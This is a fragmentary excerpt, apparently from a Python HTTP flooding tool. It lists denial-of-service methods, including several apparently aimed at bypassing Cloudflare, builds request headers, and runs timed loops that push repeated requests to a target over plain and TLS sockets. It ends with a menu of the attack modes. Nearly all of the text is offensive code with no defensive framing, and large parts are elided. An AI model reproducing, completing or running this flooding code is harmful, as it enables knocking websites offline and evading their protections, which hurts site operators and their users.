...
l7 = ["CFB","GET","NULLGET","POST","HEAD","POSTV2","SPAMMER","GETV2","HTTPFAST","HTTPFASTV2","BYPASS","BYPASSV2","CFBV2","HTTP_BETA","CFUAM"]
l4 = []
l3 = [""]
to = [""]
ot = [""]
...
def Headers(method):
    header = ""
    if method == "get" or method == "getv2" or method == "socket" or method == "httpfast" or method == "httpfastv2" or method == "bypass" or method == "bypassv2" or method == "cfbv2" or method == "head":
        ...
        header = get_host + accept + connection + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
    elif method == "nullget":
    ...
    while time.time() < timer:
        try:
            ...
            if protocol == "https":
                ...
                request = browser.get((str(target), int(port)))
            try:
                sleep(3)
                for _ in range(multiple):
                    s.sendall(str.encode(request))
    ...
    while time.time() < timer:
        try:
            ...
            if protocol == "https":
                ...
                s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
                s = ctx.wrap_socket(s, server_hostname=target)
                cfscrape.create_scraper(sess=target)
            try:
                sleep(1)
                for _ in range(multiple):
                    s.sendall(str.encode(request))
...
def usge():
    ...
    print(color.CYAN  + "   ║ •POSTV2        ║  •BYPASSV2     ║   •HTTPFASTV2   ║"+ color.END) 
    print(color.CYAN  + "   ║ •POST          ║  •CFUAM        ║   •SPAMMER      ║"+ color.END) 
    print(color.CYAN  + "   ║ •NULLGET       ║  •CFBV2        ║   •HTTP_BETA    ║"+ color.END) 
    print(color.CYAN  + "   ║ •HEAD          ║  •CFB          ║                 ║"+ color.END) 
    print(color.CYAN  + "   ║	             ║                ║                 ║"+ color.END)
    print(color.CYAN  + "   ║ 	             ║                ║                 ║"+color.END)
    print(color.CYAN  + "   ╚════════════════╩════════════════╩═════════════════╝"+ color.END)
